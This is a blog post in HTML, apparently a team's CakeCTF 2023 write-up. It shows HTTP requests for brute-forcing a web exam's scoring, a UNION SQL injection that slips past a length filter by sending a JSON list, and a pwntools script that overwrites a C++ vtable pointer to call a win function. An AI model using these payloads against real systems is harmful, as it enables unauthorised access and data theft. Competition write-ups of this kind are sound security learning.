@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Team: WANRank: 142&amp;#x2F;729
+
+TOWFL
+Solver : Whale120  
+
+An exam web application which would generate some strange sentences with unknow characters eve"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Cake CTF 2023 Writeup"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Team: WANRank: 142&amp;#x2F;729
+
+TOWFL
+Solver : Whale120  
+
+An exam web application which would generate some strange sentences with unknow characters eve"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg.jpg"/>
+
+
+<!-- Title -->
+
+<title>Cake CTF 2023 Writeup | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Cake CTF 2023 Writeup</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-02-29
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <blockquote>
+<p>Team: WAN<br>Rank: 142&#x2F;729</p>
+</blockquote>
+<h2 id="TOWFL"><a href="#TOWFL" class="headerlink" title="TOWFL"></a>TOWFL</h2><blockquote>
+<p>Solver : Whale120  </p>
+</blockquote>
+<p>An exam web application which would generate some strange sentences with unknow characters every time and you have to get flag by getting a full mark on it.<br>There are a hundred strange problems, after a try on this application with Burp Suite, I found out two key points:  </p>
+<ul>
+<li>The submition would be post to path <code>/api/submit</code> and the submission result can be get by path:<code>/api/score</code>. The statements would be the same every time if the sessions are the same.  </li>
+<li>It would return your score every time.<br>So my solution is to enumerate the answer of a problem every time by sending packages with the same session and check whether it’s right by the increase&#x2F;decrease of score.<br>about 400 tries, I finally get flag!!!<br><strong>Finall packages:</strong>  </li>
+<li>Submit  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/submit HTTP/1.1</span><br><span class="line">Host: towfl.2023.cakectf.com:8888</span><br><span class="line">Content-Length: 221</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://towfl.2023.cakectf.com:8888</span><br><span class="line">Referer: http://towfl.2023.cakectf.com:8888/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: session=.eJwFwQkNgDAMAEAvVdB3HbjptwQNBO_cvTBPww2G0TaaNUzJxcgdjbKuLVa4InJ8nDJaSQ-SrLbaV7q6Sh2E7wcTBRSv.ZU8oLA.Eg6KzOfgQ2jRkpXYuYEZaJp-mXw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[[1,0,3,1,1,3,3,0,1,0],[0,3,3,0,1,3,0,0,0,1],[2,1,3,3,0,3,3,2,2,1],[1,2,2,0,2,0,2,2,2,2],[2,3,2,2,0,3,3,1,2,3],[2,0,0,3,2,1,0,0,0,0],[3,1,0,1,0,0,1,2,2,2],[0,2,3,2,3,3,0,0,0,2],[2,2,2,0,0,0,2,0,2,1],[3,1,2,2,0,1,1,2,3,1]]</span><br></pre></td></tr></table></figure></li>
+<li>Get score  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /api/score HTTP/1.1</span><br><span class="line">Host: towfl.2023.cakectf.com:8888</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://towfl.2023.cakectf.com:8888/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: session=.eJwFwQkNgDAMAEAvVdB3HbjptwQNBO_cvTBPww2G0TaaNUzJxcgdjbKuLVa4InJ8nDJaSQ-SrLbaV7q6Sh2E7wcTBRSv.ZU8oLA.Eg6KzOfgQ2jRkpXYuYEZaJp-mXw</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<strong>Finall Result:</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.21.6</span><br><span class="line">Date: Sat, 11 Nov 2023 07:37:40 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 112</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line">Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly; Path=/</span><br><span class="line"></span><br><span class="line">&#123;&quot;data&quot;:&#123;&quot;flag&quot;:&quot;\&quot;CakeCTF&#123;b3_c4ut10us_1f_s3ss10n_1s_cl13nt_s1d3_0r_s3rv3r_s1d3&#125;\&quot;&quot;,&quot;score&quot;:100&#125;,&quot;status&quot;:&quot;ok&quot;&#125;</span><br></pre></td></tr></table></figure>
+My arms were almost broken by brute forcing through this…</li>
+</ul>
+<h2 id="Country-DB"><a href="#Country-DB" class="headerlink" title="Country DB"></a>Country DB</h2><blockquote>
+<p>Solver:Whale120<br>An simple web application use to search country ID by input two charaters every time.<br>Its backend is setup by sqlite3 and python flask, and it would filter user input by this:  </p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    req = flask.request.get_json()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;code&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty country code&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code = req[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(code) != <span class="number">2</span> <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid country code&quot;</span>)</span><br><span class="line"></span><br><span class="line">    name = db_search(code)</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        flask.abort(<span class="number">404</span>, <span class="string">&quot;No such country&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>: name&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>Search query:</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT name FROM country WHERE code=UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+<p><del>And I was stucked at here because I was thicking about SQL Injection with two characters</del><br>After about 30 minutes, I tried to send packages like this while I was testing sqlite and list container on python:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: countrydb.2023.cakectf.com:8020</span><br><span class="line">Content-Length: 13</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://countrydb.2023.cakectf.com:8020</span><br><span class="line">Referer: http://countrydb.2023.cakectf.com:8020/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:[&quot;a&quot;, &quot;b&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p>And there was a 500 error code but not 400, which means that this can passed the length filter!!!<br>So I constructed my payload into this:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: countrydb.2023.cakectf.com:8020</span><br><span class="line">Content-Length: 59</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://countrydb.2023.cakectf.com:8020</span><br><span class="line">Referer: http://countrydb.2023.cakectf.com:8020/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:[&quot;CA&#x27;) UNION SELECT FLAG FROM FLAG --&quot;,&quot;Rahlin&lt;3&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p>Because python would consider the json of parameter <code>code</code> a list with legth 2, although sqlite can’t accept a list like object, but it can be a string if I add a annotation <code>--</code> in the middle of my payload. Base on these, this UNION SQL Injection payload is effective!<br><strong>Finall Request:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.21.6</span><br><span class="line">Date: Sun, 12 Nov 2023 06:57:06 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 55</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;CakeCTF&#123;b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="vtable4b"><a href="#vtable4b" class="headerlink" title="vtable4b"></a>vtable4b</h2><blockquote>
+<p>Solver : 堇姬Naup  </p>
+</blockquote>
+<p>First,I try to <code>nc</code> it.You can look like that.If you can call the function <code>win</code>,you will get flag.  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">naup96321@DESKTOP-T2ED0OK:/mnt/c/Windows/system32$ nc vtable4b.2023.cakectf.com 9000</span><br><span class="line">Today, let&#x27;s learn how to exploit C++ vtable!</span><br><span class="line">You&#x27;re going to abuse the following C++ class:</span><br><span class="line"></span><br><span class="line">  class Cowsay &#123;</span><br><span class="line">  public:</span><br><span class="line">    Cowsay(char *message) : message_(message) &#123;&#125;</span><br><span class="line">    char*&amp; message() &#123; return message_; &#125;</span><br><span class="line">    virtual void dialogue();</span><br><span class="line"></span><br><span class="line">  private:</span><br><span class="line">    char *message_;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">An instance of this class is allocated in the heap:</span><br><span class="line"></span><br><span class="line">  Cowsay *cowsay = new Cowsay(new char[0x18]());</span><br><span class="line"></span><br><span class="line">You can</span><br><span class="line"> 1. Call `dialogue` method:</span><br><span class="line">  cowsay-&gt;dialogue();</span><br><span class="line"></span><br><span class="line"> 2. Set `message`:</span><br><span class="line">  std::cin &gt;&gt; cowsay-&gt;message();</span><br><span class="line"></span><br><span class="line">Last but not least, here is the address of `win` function which you should call to get the flag:</span><br><span class="line">  &lt;win&gt; = 0x55a3e818c61a</span><br><span class="line"></span><br><span class="line">1. Use cowsay</span><br><span class="line">2. Change message</span><br><span class="line">3. Display heap</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>If you enter the number <code>1</code>.It is a cow which can say something.<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJG0agRQp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJG0agRQp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+</li>
+<li><p>If you enter the number <code>2</code>.You can enter somthing words and sentence, and then it can change the text which spoken by the cow and heap data in third position  </p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bk3QCeAmp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bk3QCeAmp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+</li>
+<li><p>If you enter the number <code>3</code>.Yoy can look a vtable. It is a structure in C++.<br><div class="img-item" data-src="https://hackmd.io/_uploads/HJHXTgAQT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJHXTgAQT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+</li>
+</ul>
+<p>I think it can use overflow the <code>heap</code> to solve it.<br>In each round, it has differnce addresses. So first of all, the address of function <code>win</code> and the address of <code>heap</code> must be re-received in each round.<br>Next, we need to change its pointer so that it can control the heap first, and then call the function of win by entering 1.  </p>
+<p>Take this picture as an example.If use payload  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(b&#x27;A&#x27;*8)+p64(int(addr,16))+(b&quot;A&quot;*8)*2+p64(int(t_address,16))</span><br></pre></td></tr></table></figure>
+<p>and then you enter 1,it will call:  </p>
+<p><strong>0x5634714d2ed0</strong>-&gt;<strong>0x5634714d2eb8</strong>-&gt;<strong>function win</strong></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkJcw-0Qp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkJcw-0Qp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><strong>Solve Script</strong>  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;vtable4b.2023.cakectf.com&quot;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uns_addr = r.recvuntil(<span class="string">b&quot;\n\n1.&quot;</span>)</span><br><span class="line">addr = uns_addr.split(<span class="string">b&quot;\n\n1&quot;</span>)[<span class="number">0</span>][-<span class="number">14</span>:]</span><br><span class="line"><span class="built_in">print</span>(addr)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&quot;3\n&quot;</span>)</span><br><span class="line">heap_data = r.recvuntil(<span class="string">b&quot;\n\n1.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(heap_data)</span><br><span class="line">t_address = heap_data.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">9</span>][:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(t_address)</span><br><span class="line"></span><br><span class="line">r.recv(timeout=<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;: &quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">r.send((<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)+p64(<span class="built_in">int</span>(addr,<span class="number">16</span>))+(<span class="string">b&quot;A&quot;</span>*<span class="number">8</span>)*<span class="number">2</span>+p64(<span class="built_in">int</span>(t_address,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+                <li class="previous page-item d-inline"><a href="/2024/02/29/CGGC-WP/" class="page-link float-left">&larr;  Newer</a></li>
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/02/29/Hackappatoi/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
